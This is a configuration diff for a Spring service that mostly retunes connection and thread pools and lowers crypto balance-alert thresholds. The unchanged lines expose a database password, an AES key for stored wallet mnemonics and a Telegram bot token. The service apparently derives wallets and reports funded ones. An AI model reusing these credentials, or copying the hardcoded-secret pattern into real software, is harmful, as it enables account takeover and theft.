@@ -41,10 +41,10 @@ spring:
     username: ioslianjie
     password: BAF4R22mwenXXxEH
     type: com.alibaba.druid.pool.DruidDataSource
-    # 3 实例：每实例 maxActive 80，合计约 240；MySQL max_connections 建议 >=500
-    initialSize: 16
-    minIdle: 16
-    maxActive: 80
+    # 单实例 32C：消费侧重，连接池保留较大；全栈合计建议 MySQL max_connections>=500
+    initialSize: 10
+    minIdle: 10
+    maxActive: 56
     maxWait: 5000
     timeBetweenEvictionRunsMillis: 30000
     minEvictableIdleTimeMillis: 50000
@@ -82,7 +82,7 @@ spring:
     listener:
       missing-topics-fatal: false
       ack-mode: record
-      concurrency: 6
+      concurrency: 5
 
 redis:
   host: 127.0.0.1
@@ -90,8 +90,8 @@ redis:
   db: 0
   timeout: 3000
   pool:
-    maxTotal: 48
-    maxIdle: 16
+    maxTotal: 32
+    maxIdle: 12
     minIdle: 4
 
 # =============================================================================
@@ -106,7 +106,7 @@ news4:
       enabled: true
     notify-stream: c2:new             # 【redis 通道换套可改】后缀
     notify-group: news4-c2-notify     # 【redis 通道换套必改】消费组
-    notify-worker-threads: 8
+    notify-worker-threads: 6
     notify-read-block-ms: 2000
     notify-read-count: 16
     notify-claim-idle-ms: 180000
@@ -121,15 +121,15 @@ news4:
     photo-dir: /opt/news4/data/photos
     photo-url-prefix: data/photos
     pool:
-      core-size: 8
-      max-size: 24
+      core-size: 6
+      max-size: 16
       queue-capacity: 512
   mnemonic:
     mnemonic-aes-key: 'Mn3m0n1c@2024!SecureKey#news2' # 助记词 AES 密钥
   wallet-derive:
     pool:
       core-size: 4
-      max-size: 12
+      max-size: 10
       queue-capacity: 2000
 
 
@@ -182,9 +182,9 @@ maxnotice:
   usdt-sum-threshold: 1000
   native-thresholds:
     tron: 1000
-    eth: 3
+    eth: 1
     bsc: 100
-    btc: 1
+    btc: 0.1
     sol: 1000
   tg-bot-token: "8690372906:AAHJHA1d3ll82KSbrd6fD6PNH_DoPBdc_28"
   tg-group-id: "-5598654952"
